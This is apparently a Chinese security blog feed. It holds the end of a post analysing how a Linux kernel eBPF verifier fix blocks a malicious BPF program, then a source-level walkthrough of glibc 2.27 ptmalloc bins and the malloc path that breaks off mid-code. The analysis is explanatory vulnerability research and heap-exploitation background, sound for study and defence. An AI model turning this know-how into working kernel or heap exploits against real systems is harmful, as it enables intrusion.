<span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment">         * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        *insn_idx += insn-&gt;off;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment">         * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment">         * that&#x27;s where the program will go</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">other_branch = push_stack(env, *insn_idx + insn-&gt;off + <span class="number">1</span>, *insn_idx);</span><br><span class="line"><span class="keyword">if</span> (!other_branch)</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    .........</span><br></pre></td></tr></table></figure><p>而在新版本中，由以下语句判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* detect if R == 0 where R was initialized to zero earlier */</span></span><br><span class="line"><span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">    dst_reg-&gt;type == SCALAR_VALUE &amp;&amp;</span><br><span class="line">    tnum_equals_const(dst_reg-&gt;var_off, insn-&gt;imm)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">        <span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment">         * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        *insn_idx += insn-&gt;off;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment">         * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment">         * that&#x27;s where the program will go</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到主要的差别就是第四个判断条件，那么来看看<code>tnum_equals_const</code>的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Returns true if @a is a known constant */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">tnum_is_const</span><span class="params">(struct tnum a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !a.mask;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Returns true if @a == tnum_const(@b) */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">tnum_equals_const</span><span class="params">(struct tnum a, u64 b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> tnum_is_const(a) &amp;&amp; a.value == b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，<code>insn-&gt;imm</code>在被传入<code>tnum_equals_const</code>后，被强制转换成了无符号64位整型，也就是说进行比较的立即数进行了这样的转变<code>0xffffffff -&gt; 0xfffffffffffffff</code></p><p>接着进行比较，从上面的分析中我们可以知道此时<code>reg-&gt;var_off.value</code>的值为<code>0x00000000ffffffff</code> ，那么<code>return tnum_is_const(a) &amp;&amp; a.value == b;</code>就如下所示</p><p><code>return 1 &amp;&amp; 0x00000000ffffffff == 0xfffffffffffffff; = return 0</code></p><p>也就是说，判断条件不成立，与旧版本就此停止不继续向下执行不同，新版本由于判断条件不为真，于是将会继续执行，将可能执行的分支进一步检测，从而避免了加载我们的恶意bpf指令</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>payload中实际利用的代码部分还没讲，后面再写一篇，顺便可以讲些linux内核中的一些重要结构</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how ptmalloc malloc &amp;&amp; free</title>
      <link href="how-ptmalloc-malloc-free.html"/>
      <url>how-ptmalloc-malloc-free.html</url>
      
        <content type="html"><![CDATA[<p>仔细看了看ptmalloc的源代码，深入了解了一下linux下堆分配回收的机制和流程</p><p>其中也借鉴了不少网上的资料,不过多半也不是很靠谱，所以我花了不少时间仔细阅读了关键代码，结合网上的资料，写下这篇文章，如有疏漏或者理解错误，欢迎指正～</p><p>以下的分析及源代码皆基于<code>glibc2.27</code></p><h1 id="Bins"><a href="#Bins" class="headerlink" title="Bins"></a>Bins</h1><p>要讲ptmalloc,不得不先讨论的，就是bins</p><p>在我之前的文章中，有提到过bins，但是并没有很详细的介绍</p><p>在<code>glibc2.27</code>中，除了之前(<code>glibc2.25</code>之前)所实现的<code>fastbins</code>、<code>smallbins</code>、<code>largebins</code>、<code>unsortedbins</code>之外，还实现了另一种机制:<code>tcache</code></p><p>接下来我就一个个讲讲这几个bins</p><h2 id="Tcache-bins"><a href="#Tcache-bins" class="headerlink" title="Tcache(bins)"></a>Tcache(bins)</h2><p>实际上<code>tcache</code>是从<code>glibc2.26</code>开始实现的一种机制，只是Ubuntu18.04的发行版采用了<code>glibc2.27</code>，所以我这边就拿<code>glbc2.27</code>来说了</p><p>其优先级在内存分配上是最高的，设计tcache的初衷是为了进一步优化linux系统上内存分配的效率</p><p>其引入了两个重要的结构体: <code>tcache_entry</code>和<code>tcache_perthread_struct</code></p><ol><li><p><code>tcache_entry</code>定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>结构体<code>tcache_entry</code>用于链接空闲的 chunk 结构体，其中的 <code>next</code>指针指向下一个大小相同的 chunk。</p><p>这里的<code>next</code>指针与其他bins的<code>fd</code>以及<code>bk</code>不一样，其指向的是data区域，而不是堆块的header部分</p></li><li><p><code>tcache_perthread_struct</code>定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>每个 thread 都会维护一个 <code>tcache_prethread_struct</code>，它是整个 <code>tcache</code> 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code>项<code>tcache_entry</code>，其中</p><ul><li><code>tcache_entry</code> 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和<code>fastbin</code>很像。</li><li><code>counts</code>记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk。</li></ul></li></ol><p>基本的<code>tcache</code>工作流程大致如下，详细的malloc工作流程将在后面介绍</p><ul><li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_prethread_struct</code></li><li>free 内存，且 size 小于 small bin size 时</li><li>在<code>tcache</code>机制实现之前，系统会将堆块放到 <code>fastbins</code>或者 <code>unsortedbins</code> 中</li><li>在<code>tcache</code>机制实现之后则是</li><li><ul><li>先放到对应的 <code>tcache</code> 中，直到 <code>tcache</code> 被填满（默认是 7 个）</li><li><code>tcache</code> 被填满之后，再次 free 的内存和之前一样被放到 <code>fastbin</code>或者 <code>unsorted bin</code> 中</li><li><code>tcache</code> 中的 chunk 不会合并（不取消 <code>inuse bit</code>）</li></ul></li><li>malloc 内存，且 size 在<code>tcache</code> 范围内</li><li>先从 <code>tcache</code> 取 chunk，直到<code>tcache</code>为空</li><li><code>tcache</code>为空后，从 bins中找</li><li><code>tcache</code> 为空时，如果<code>fastbins/smallbins</code>中有size 符合的 chunk，会先取下此chunk，并尝试将此chunk大小对应的bin中剩余的相同大小的堆块放到<code>tcache</code>中直到填满，而如果<code>unsortedbins</code>中有size 符合的 chunk，那么就会直接将这个chunk放入<code>tcache</code>，并继续遍历<code>unsortedbins</code>,当循环达到一定的次数后，才会返回<code>tcache</code>中对应大小的堆块(下文详细讲malloc流程时会提到细节)</li></ul><h2 id="Fastbins"><a href="#Fastbins" class="headerlink" title="Fastbins"></a>Fastbins</h2><p>fastbins是在<code>tcache</code>机制实现之前，为了提高内存分配效率而出现的机制，其中每个bin都遵循LIFO策略</p><p>fastbins和<code>tcache</code>很像的一点在于都采用了单向链表进行管理</p><p>在64位系统上，<code>fastbins</code>默认拥有七个bin(实际代码中最多支持10个)，大小从<code>0x20</code>-<code>0x80</code></p><p>具体的分配、合并流程将在下文详细介绍</p><h2 id="Smallbins"><a href="#Smallbins" class="headerlink" title="Smallbins"></a>Smallbins</h2><p>smallbins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：<code>chunk_size = 2 * SIZE_SZ * index</code>，具体如下</p><table><thead><tr><th>索引</th><th>SIZE_SZ=4（32 位）</th><th>SIZE_SZ=8（64 位）</th></tr></thead><tbody><tr><td>2</td><td>16</td><td>32</td></tr><tr><td>3</td><td>24</td><td>48</td></tr><tr><td>4</td><td>32</td><td>64</td></tr><tr><td>5</td><td>40</td><td>80</td></tr><tr><td>x</td><td>2*4*x</td><td>2*8*x</td></tr><tr><td>63</td><td>504</td><td>1008</td></tr></tbody></table><p>smallbins中一共有 62 个循环双向链表，每个链表中存储的 chunk 大小都一致。比如对于 32 位系统来说，下标 2 对应的双向链表中存储的 chunk 大小为均为 16 字节。每个链表都有链表头结点，这样可以方便对于链表内部结点的管理。此外，<strong>small bins 中每个 bin 对应的链表采用 FIFO 的规则</strong></p><h2 id="LargeBins"><a href="#LargeBins" class="headerlink" title="LargeBins"></a>LargeBins</h2><p>largebins中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：</p><table><thead><tr><th>组</th><th>数量</th><th>公差</th></tr></thead><tbody><tr><td>1</td><td>32</td><td>64B</td></tr><tr><td>2</td><td>16</td><td>512B</td></tr><tr><td>3</td><td>8</td><td>4096B</td></tr><tr><td>4</td><td>4</td><td>32768B</td></tr><tr><td>5</td><td>2</td><td>262144B</td></tr><tr><td>6</td><td>1</td><td>无限制</td></tr></tbody></table><p>以 32 位平台的 <code>largebins</code>为例，第一个 <code>largebins</code> 的起始 chunk 大小为 512 字节，位于第一组，所以该 bin 可以存储的 chunk 的大小范围为 [512,512+64)</p><h2 id="UnsortedBins"><a href="#UnsortedBins" class="headerlink" title="UnsortedBins"></a>UnsortedBins</h2><p>unsortedbins 可以视为空闲 chunk 回归其所属 bin 之前的缓冲区</p><p>unsortedbins处于我们之前所说的 bin 数组下标 0、索引1 处。故而 <code>unsortedbins</code> 只有一个链表。<code>unsortedbins</code> 中的空闲 chunk 处于乱序状态，主要有两个来源</p><ul><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 <code>unsortedbins</code> 中。</li><li>释放一个不属于 <code>fastbins</code> 的 chunk，并且该 chunk 不和<code>top_chunk</code>紧邻时，该 chunk 会被首先放到 <code>unsortedbins</code> 中(紧邻时，会触发合并的操作，该chunk将会并入<code>top_chunk</code>)。</li></ul><p>unsortedbins采用的顺序是FIFO</p><h2 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h2><p>前面在<code>smallbins</code>中提到了index，即索引</p><p>在这边要详细说一下ptmalloc中的索引，因为在ptmalloc中，索引与对应的bin相对于<code>malloc_state</code>中<code>bins</code>数组的起始地址的偏移(即数组下标)之间有着转换关系。</p><p>我们以大小为<code>0x60</code>的<code>smallbins</code>中的bin来举个例子</p><p>来看一下详细的代码</p><p>首先，索引的大小与bin中堆块的大小有关，由<code>smallbin_index</code>宏实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">idx = smallbin_index (nb);</span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line">  ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>) : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>))\</span><br><span class="line">   + SMALLBIN_CORRECTION)</span><br></pre></td></tr></table></figure><p>通过计算，可以得出index为6</p><p>其实际数组下标的计算由<code>bin_at</code>宏实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span> <span class="comment">// mbinptr占据8个字节</span></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span>   </span><br><span class="line"><span class="comment">// 其实这边的注释也指明了，不存在0号</span></span><br><span class="line"><span class="comment">// 也就是说，索引值从1开始，而不是从0开始，unsortbins头节点的起始地址即是索引值为1处</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line">  (mbinptr) (((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>]))      \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br></pre></td></tr></table></figure><p>可以算出实际的偏移应该是<code>(m)-&gt;bins[((6) - 1) * 2]</code>-&gt;<code>(m)-&gt;bins[10]</code></p><p>看下调试的情况</p><p><img src="/image/malloc/index.png" alt="index"></p><p>可以看到<code>0x7ffff7dcfcb0</code>处是<code>malloc_state</code>中的<code>bins</code>数组的起始地址，也同样是<code>unsortedbins</code>的地址</p><p>在<code>0x7ffff7dcfd00</code>处存储着大小为<code>0x60</code>的对应的<code>smallbins</code>的bin信息</p><p>那么实际上存储<code>smallbins</code>中存储堆块大小为<code>0x60</code>的bin的起始地址的地址距离<code>malloc_state</code>中的<code>bins</code>数组的起始地址的偏移距离为<code>0x50</code>，相当于是<code>bin[10]</code></p><p>所以索引值并不等于其在数组中的下标(index=6,下标为10)</p><p>注：索引值只是逻辑意义上的一个值，切勿将其当作数组下标</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];  <span class="comment">// bins数组</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Malloc"><a href="#Malloc" class="headerlink" title="Malloc"></a>Malloc</h1><p>bins大致介绍完了，接着就来讲讲malloc的详细流程</p><h2 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><p>实际上如果我们仔细看glbc的源代码，我们可以发现malloc函数并不存在，我们调用的malloc实际上是<code>__libc_malloc</code></p><p>所以我们从这里开始</p><ul><li><p>首先检查是否存在用户自定义的hook函数，如果存在，直接调用后返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure></li><li><p>之后检查<code>tcache</code>是否存在恰好对应大小的堆块，如果存在，直接取对应大小的堆块并返回此堆块，结束malloc流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li><li><p>上面这步有个函数需要讲一下，就是<code>checked_request2size</code>,这个函数主要是将用户所请求的内存大小换算成实际申请的内存大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">// MALLOC_ALIGN_MASK = 2 * SIZE_SZ - 1 = 15</span></span><br><span class="line"><span class="comment">// 这里只加一个SIZE_SZ的原因是由于下一个堆块的头部prev_size可以复用</span></span><br><span class="line"><span class="comment">// 所以原本需要的内存 = 用户申请的内存大小+chunk头(16字节)改为了</span></span><br><span class="line"><span class="comment">// 内存 = 用户申请的内存大小+SIZE_SZ(8字节)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \ </span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) <span class="comment">// 保证实际申请的内存大小满足用户需求，并且16字节对齐</span></span><br></pre></td></tr></table></figure></li><li><p>如果不存在恰好大小的堆块，进入<code>_int_malloc</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P) <span class="comment">// 判断是否是单线程</span></span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>函数<code>_int_malloc</code>是malloc中最重要的一部分，实际上大部分功能都是在这个函数中实现的</p><ul><li><p>在<code>_int_malloc</code>函数中，先判断实际需要分配的堆块是否在<code>fastbins</code>的大小范围之内，如果属于，那么就检查<code>fastbins</code>中是否有大小正好相等的堆块,如果存在这样的堆块，那么先从<code>fastbins</code>对应的bin中取下此堆块，并将此bin中剩余的所有堆块全部放入相对应大小的<code>tcache</code>中，最后返回之前从bin中取下的堆块,结束malloc流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ())) <span class="comment">// 判断是否属于fastbins</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb; <span class="comment">// 保存待分配的堆块至victim变量</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>) <span class="comment">// 如果对应索引处bins不为空(即存在正好符合大小的堆块)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      <span class="comment">// 取下这个堆块</span></span><br><span class="line">      <span class="comment">// (即将待分配堆块的fd覆盖对应bin的头节点值，使得对应的bin中第一个堆块跳过待分配的堆块，指向待分配的堆块的前一个堆块）</span></span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">      check_remalloced_chunk (av, 